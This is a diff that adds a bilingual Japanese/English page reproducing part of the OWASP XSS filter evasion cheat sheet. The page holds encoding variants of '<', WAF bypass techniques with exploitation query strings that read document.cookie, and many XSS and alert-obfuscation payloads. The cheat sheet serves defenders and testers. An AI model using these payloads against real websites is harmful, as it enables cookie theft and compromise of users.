+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x00003C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x000003C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x3C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x03C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x003C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x0003C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x00003C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x000003C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X3C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X03C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X003C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X0003C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X00003C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X000003C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X3C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X03C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X003C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X0003C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X00003C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X000003C;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `\\x3c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `\\x3C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `\\u003c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `\\u003C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+## Methods to Bypass WAF – Cross-Site Scripting
+
+### General issues
+
+#### Stored XSS
+
+If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Reflected XSS in JavaScript
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### Example
+
+
+```js
+<script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### Exploitation
+
+
+```js
+/?xss=500); alert(document.cookie);//
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### DOM-based XSS
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### Example
+
+
+```js
+<script> ... eval($\_GET\[xss\]); ... </script>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### Exploitation
+
+
+```js
+/?xss=document.cookie
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### XSS via request Redirection
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### Vulnerable code
+
+
+```js
+...
+header('Location: '.$_GET['param']);
+...
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### As well as
+
+
+```js
+...
+header('Refresh: 0; URL='.$_GET['param']);
+...
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### This request will not pass through the WAF
+
+
+```html
+/?param=<javascript:alert(document.cookie>)
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+This request will pass through the WAF and an XSS attack will be conducted in certain browsers:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### WAF ByPass Strings for XSS
+
+<!-- markdownlint-disable MD038-->
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&lt;Video> <source onerror = "javascript: alert (XSS)">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&lt;Input value = "XSS" type = text>`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<applet code="javascript:confirm(document.cookie);">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<isindex x="javascript:" onmouseover="alert(XSS)">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `">&lt;/SCRIPT&gt;”>’>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `"><img src="x:x" onerror="alert(XSS)">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `"><iframe src="javascript:alert(XSS)">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<object data="javascript:alert(XSS)">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<isindex type=image src=1 onerror=alert(XSS)>`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<img  src="x:gif" onerror="window['al\\u0065rt'](0)"></img>`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<form><a href="javascript:\\u0061lert(1)">X`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<style>//*&#123;x:expression(alert(/xss/))&#125;//<style></style>`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+On Mouse Over​:
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<img src="/" =_=" title="onerror='prompt(1)'">`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<script x> alert(1) </script 1=2`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83">&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)">&lt;/OBJECT&gt; `
+<!-- markdownlint-enable MD038-->
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Filter Bypass Alert Obfuscation
+
+- `(alert)(1)`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `a=alert,a(1)`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `[1].find(alert)`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `top[“al”+”ert”](1)`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `top[/al/.source+/ert/.source](1)`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `al\\u0065rt(1)`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `top[‘al\\145rt’](1)`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `top[‘al\\x65rt’](1)`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `top[8680439..toString(30)](1)`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `alert?.()`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `(alert())`
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### The payload should include leading and trailing backticks
+
+
+```js
+&#96;`${alert``}`&#96;
+```
+
+</div>
+
+</section>
 </div>
 
 ## Attribution
@@ -31,7 +4650,7 @@ hide_title: true
 - Copyright: Cheat Sheets Series Team
 - License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
 - License URL: https://creativecommons.org/licenses/by-sa/4.0/
-- Changes: Placeholder navigation page added. No translated OWASP body content copied yet.
+- Changes: English original retained for comparison. Japanese translation added. Bilingual display generated from official source and local Japanese notes.
 - Retrieved: 2026-05-20
 
 </div>
